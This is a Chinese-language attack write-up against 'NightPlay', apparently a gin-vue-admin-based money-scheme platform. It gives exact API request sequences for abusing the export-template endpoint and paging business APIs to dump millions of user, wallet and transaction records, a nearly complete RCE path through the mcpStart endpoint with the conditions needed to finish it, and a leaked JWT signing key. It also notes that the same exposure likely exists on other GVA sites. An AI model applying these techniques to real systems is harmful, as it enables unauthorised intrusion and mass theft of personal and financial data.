# NightPlay — GVA mcpStart 容器 RCE 未竟路径 + 资金盘全量脱库

> GVA 二开平台 autoCode/mcpStart 几乎可 RCE，卡在容器执行位
> 113 万用户、227 万钱包、120 万流水全量拉取

## mcpStart → 容器内 RCE（差一步）

GVA 的 `/autoCode/mcpStart` 接口可以**让应用自己拉起 `mcp.path` 指向的进程**。

```
攻击路径:
  setSystemConfig → 改 mcp.path 为上传的文件路径
  → mcpStart → 应用尝试执行该文件

卡点:
  · 上传通道落一般数据文件，无 +x 执行位
  · installPlugin (ZIP 保留 0755 模式)：未走通
  · 容器密封（唯一挂载 /，999GB EBS）
  · 无 bind mount、无 shell 拼接、DB 无 FILE 权限
```

**如果以下任一条件满足即可 RCE：**
1. `installPlugin` 的 ZIP 解压保留文件权限 (0755)
2. 容器内找到已有的可执行文件重定向
3. 脚本解释器路径（如 `/bin/sh`）可通过 mcp.path 直接调用
4. Docker 容器 cap_add 包含 FOWNER → 上传后 `chown` 绕过

## 全量脱库手法

### 导出通道（sysExportTemplate）

```http
POST /sysExportTemplate/createSysExportTemplate
{"tableName":"biz_users"}
→ 返回模板 ID

GET /sysExportTemplate/exportExcel?id=xxx
→ 返回一次性下载 token

GET /sysExportTemplate/exportExcelByToken?token=xxx
→ 下载 XLSX (每表最多 20 万行)
```

**186 表 / 131 万行通过此通道导出。**

### 业务接口补全（突破 20 万限制）

导出通道有 limit 且对非默认库返回「获取失败」→ 改用业务接口逐页拉取：

```
/bizUser/getBizUserList                  → 113 万用户 (100% 覆盖)
/bizWallet/getBizWalletAccountList       → 227 万钱包
/bizWallet/getBizWalletTransactionList   → 120 万流水
/bizGatewayNode/getBizGatewayRawServerList → 87 台 AWS 实例
/bizOrg/getBizAgentList                  → 代理体系
```

6 路并发，8 小时未断。总计 785 万行。

## 用户数据字段（60+ 字段）

特别注意最后 5 个 `control*` 字段 — **远程控制通道**：

```
controlOnline, controlDeviceId, controlDeviceCode, 
controlDeviceStatus, controlWsStatus, controlLastSeenAt
```

→ 平台对 Android 端有远控能力（设备在线状态、WebSocket 控制会话）。

## 资金盘模型

```
adminBuyBack — 管理员回购订单:
  principal: 139400, profit: 13940, total: 153340  ← 10% 收益率
  remark: "Codex接口测试：100返110"

adjustBizUserBalance — 人工调账:
  amount: 111111111  ← 单次 1.11 亿（单位随币种）
  remark: "【人工纠错】1111111"
```

## AWS 基础设施画像

```
87 台节点 (EC2 12 + Lightsail 75)
含: 实例 ID / 公网 IP / 内网 IP / 规格 / 区域 / 状态
标签: CreatedBy=Codex (AI 代管)
角色: 核心后端 | APK分发缓存(31台) | TURN中继 | TG SOCKS代理(韩国)
```

**biz_gateway_raw_servers 是 GVA 二开平台的基础设施暴露面** — 做网关/CDN 的 GVA 站都可能有此表。

## JWT 密钥不轮换教训

```
密钥: 3acbb4e2-a53d-488b-a9d3-0cca21c6e11b (UUID 格式)
应急只清了 Redis 会话，密钥未换
→ 旧 token 在密钥验签层仍有效
→ 8 小时后隧道重连 token 还能用
```

**GVA 站应急时必须同时轮换 JWT signing key + 清 Redis。**
